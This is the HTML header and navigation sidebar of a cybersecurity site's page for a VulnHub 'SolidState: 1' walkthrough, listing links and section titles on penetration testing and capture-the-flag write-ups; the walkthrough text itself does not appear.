
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.1, mkdocs-material-7.1.9">
    
    
      
        <title>SolidState: 1 - LeeCyberSec</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.ca7ac06f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.f1a3b89f.min.css">
        
          
          
          <meta name="theme-color" content="#000000">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
      
    
    
    
    
      


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
  
    
    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#vulnhub-solidstate-1" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../index.html" title="LeeCyberSec" class="md-header__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            LeeCyberSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              SolidState: 1
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../../../index.html" class="md-tabs__link">
      Home
    </a>
  </li>

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../red-teaming/index.html" class="md-tabs__link">
        Red Teaming
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../penetration-testing/index.html" class="md-tabs__link">
        Penetration Testing
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../index.html" class="md-tabs__link md-tabs__link--active">
        Walkthrough
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../blue-teaming/index.html" class="md-tabs__link">
        Blue Teaming
      </a>
    </li>
  

      
        
  
  


  <li class="md-tabs__item">
    <a href="../../../about/index.html" class="md-tabs__link">
      About Me
    </a>
  </li>

      
    </ul>
  </div>
</nav>
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../index.html" title="LeeCyberSec" class="md-nav__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    LeeCyberSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../index.html" class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      <label class="md-nav__link" for="__nav_2">
        Red Teaming
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Red Teaming" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Red Teaming
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/index.html" class="md-nav__link">
        __index__
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
      
      <label class="md-nav__link" for="__nav_2_2">
        Unix System
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Unix System" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_2">
          <span class="md-nav__icon md-icon"></span>
          Unix System
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/unix-system/filesystem.html" class="md-nav__link">
        Filesystem
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/unix-system/commands.html" class="md-nav__link">
        Commands
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/unix-system/services.html" class="md-nav__link">
        Services
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/unix-system/scripting.html" class="md-nav__link">
        Scripting
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/unix-system/terminal.html" class="md-nav__link">
        Terminal
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/antivirus-evasion/index.html" class="md-nav__link">
        Antivirus Evasion
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
      
      <label class="md-nav__link" for="__nav_2_4">
        Exploit Development
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Exploit Development" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_4">
          <span class="md-nav__icon md-icon"></span>
          Exploit Development
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/exploit-dev/buffer-overflow/index.html" class="md-nav__link">
        Buffer Overflow
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/exploit-dev/metasploit-framework/index.html" class="md-nav__link">
        Metasploit Framework
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/exploit-dev/nse-script/index.html" class="md-nav__link">
        Nmap Scripting Engine
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/malware-development/index.html" class="md-nav__link">
        Malware development
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../red-teaming/powershell-empire/index.html" class="md-nav__link">
        Powershell Empire
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      <label class="md-nav__link" for="__nav_3">
        Penetration Testing
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Penetration Testing" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Penetration Testing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/index.html" class="md-nav__link">
        __index__
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
      
      <label class="md-nav__link" for="__nav_3_2">
        External & Internal
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="External & Internal" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_2">
          <span class="md-nav__icon md-icon"></span>
          External & Internal
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" type="checkbox" id="__nav_3_2_1" >
      
      <label class="md-nav__link" for="__nav_3_2_1">
        Reconnaissance
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Reconnaissance" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_1">
          <span class="md-nav__icon md-icon"></span>
          Reconnaissance
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/reconnaissance/infor-gathering.html" class="md-nav__link">
        Info Gathering
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/reconnaissance/active-scanning.html" class="md-nav__link">
        Active Scanning
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" type="checkbox" id="__nav_3_2_2" >
      
      <label class="md-nav__link" for="__nav_3_2_2">
        Common Services
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Common Services" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_2">
          <span class="md-nav__icon md-icon"></span>
          Common Services
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/general.html" class="md-nav__link">
        general
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/ftp-21.html" class="md-nav__link">
        ftp 21
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/smtp-25.html" class="md-nav__link">
        smtp 25
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/dns-53.html" class="md-nav__link">
        dns 53
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/pop3-110.html" class="md-nav__link">
        pop3 110
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/nfs-111.html" class="md-nav__link">
        nfs 111
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/smb-139-445.html" class="md-nav__link">
        smb 139,445
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/snmp-161.html" class="md-nav__link">
        snmp 161
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/mssql-1443.html" class="md-nav__link">
        mssql 1443
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/mysql-3306.html" class="md-nav__link">
        mysql 3306
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/postgresql-5432.html" class="md-nav__link">
        postgresql 5432
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/common-services/mongodb-27017.html" class="md-nav__link">
        mongodb 27017
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" >
      
      <label class="md-nav__link" for="__nav_3_2_3">
        Remote Exploitation
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Remote Exploitation" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_3">
          <span class="md-nav__icon md-icon"></span>
          Remote Exploitation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html" class="md-nav__link">
        Unix&Linux
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/remote-exploitation/windows.html" class="md-nav__link">
        Windows
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/file-transfer/index.html" class="md-nav__link">
        File Transfer
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/password-attack/index.html" class="md-nav__link">
        Password Attack
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/port-redirection-tunneling/index.html" class="md-nav__link">
        Redirec & Tunnel
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_7" type="checkbox" id="__nav_3_2_7" >
      
      <label class="md-nav__link" for="__nav_3_2_7">
        Privilege Escalation
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Privilege Escalation" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_7">
          <span class="md-nav__icon md-icon"></span>
          Privilege Escalation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html" class="md-nav__link">
        Unix Enumeration
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html" class="md-nav__link">
        Unix Escalation
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html" class="md-nav__link">
        Windows Enumeration
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html" class="md-nav__link">
        Windows Escalation
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
      
      <label class="md-nav__link" for="__nav_3_3">
        Active Directory
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Active Directory" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_3">
          <span class="md-nav__icon md-icon"></span>
          Active Directory
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/active-directory/enumeration.html" class="md-nav__link">
        Enumeration
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/active-directory/authentication.html" class="md-nav__link">
        Authentication
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/active-directory/lateral-movement.html" class="md-nav__link">
        Lateral Movement
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/active-directory/persistent.html" class="md-nav__link">
        Persistent
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" type="checkbox" id="__nav_3_4" >
      
      <label class="md-nav__link" for="__nav_3_4">
        Web Application
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Web Application" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_4">
          <span class="md-nav__icon md-icon"></span>
          Web Application
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/web-application/enumeration.html" class="md-nav__link">
        Enumeration
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/web-application/exploitation.html" class="md-nav__link">
        Exploitation
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/mobile-application/index.html" class="md-nav__link">
        Moble Application
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/wireless-rfid/index.html" class="md-nav__link">
        Wireless & RFID
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../../penetration-testing/social-engineering/index.html" class="md-nav__link">
        Social Engineering
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
      
      <label class="md-nav__link" for="__nav_4">
        Walkthrough
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Walkthrough" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Walkthrough
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../index.html" class="md-nav__link">
        __index__
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
      
      <label class="md-nav__link" for="__nav_4_2">
        Hack The Box
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Hack The Box" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_2">
          <span class="md-nav__icon md-icon"></span>
          Hack The Box
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Lame/index.html" class="md-nav__link">
        HTB Lame
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Legacy/index.html" class="md-nav__link">
        HTB Legacy
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Devel/index.html" class="md-nav__link">
        HTB Devel
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Popcorn/index.html" class="md-nav__link">
        HTB Popcorn
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Beep/index.html" class="md-nav__link">
        HTB Beep
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Optimum/index.html" class="md-nav__link">
        HTB Optimum
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Bastard/index.html" class="md-nav__link">
        HTB Bastard
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Cronos/index.html" class="md-nav__link">
        HTB Cronos
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Blue/index.html" class="md-nav__link">
        HTB Blue
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Nineveh/index.html" class="md-nav__link">
        HTB Nineveh
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Shocker/index.html" class="md-nav__link">
        HTB Shocker
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Bashed/index.html" class="md-nav__link">
        HTB Bashed
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Nibbles/index.html" class="md-nav__link">
        HTB Nibbles
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Jerry/index.html" class="md-nav__link">
        HTB Jerry
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Bastion/index.html" class="md-nav__link">
        HTB Bastion
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Tabby/index.html" class="md-nav__link">
        HTB Tabby
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/ServMon/index.html" class="md-nav__link">
        HTB ServMon
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Canape/index.html" class="md-nav__link">
        HTB Canape
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/Help/index.html" class="md-nav__link">
        HTB Help
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
      
      <label class="md-nav__link" for="__nav_4_3">
        TryHackMe
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="TryHackMe" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_3">
          <span class="md-nav__icon md-icon"></span>
          TryHackMe
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/MrRobot/index.html" class="md-nav__link">
        Mr Robot
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/Thompson/index.html" class="md-nav__link">
        Thompson
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/Kenobi/index.html" class="md-nav__link">
        Kenobi
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/Ignite/index.html" class="md-nav__link">
        Ignite
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/SteelMountain/index.html" class="md-nav__link">
        Steel Mountain
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tryhackme/HackPark/index.html" class="md-nav__link">
        HackPark
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
      
      <label class="md-nav__link" for="__nav_4_4">
        VulnHub
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="VulnHub" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_4">
          <span class="md-nav__icon md-icon"></span>
          VulnHub
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../Brainpan-1/index.html" class="md-nav__link">
        Brainpan 1
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../S2-052/index.html" class="md-nav__link">
        Pentester Lab: S2-052
      </a>
    </li>
  

          
            
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          SolidState: 1
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="index.html" class="md-nav__link md-nav__link--active">
        SolidState: 1
      </a>
      
        
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#openning-services" class="md-nav__link">
    Openning Services
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-application" class="md-nav__link">
    Web Application
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#james-server" class="md-nav__link">
    JAMES Server
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    Foothold
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mailbox-to-ssh-credential" class="md-nav__link">
    Mailbox to SSH credential
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#james-server-rce-to-bypass-retrict-bash" class="md-nav__link">
    James server RCE to bypass retrict bash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-pspy-to-monitor-process" class="md-nav__link">
    Using pspy to monitor process
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../Wintermute-1-Straylight/index.html" class="md-nav__link">
        Wintermute: 1 (Straylight)
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../Wintermute-1-Neuromancer/index.html" class="md-nav__link">
        Wintermute: 1 (Neuromancer)
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
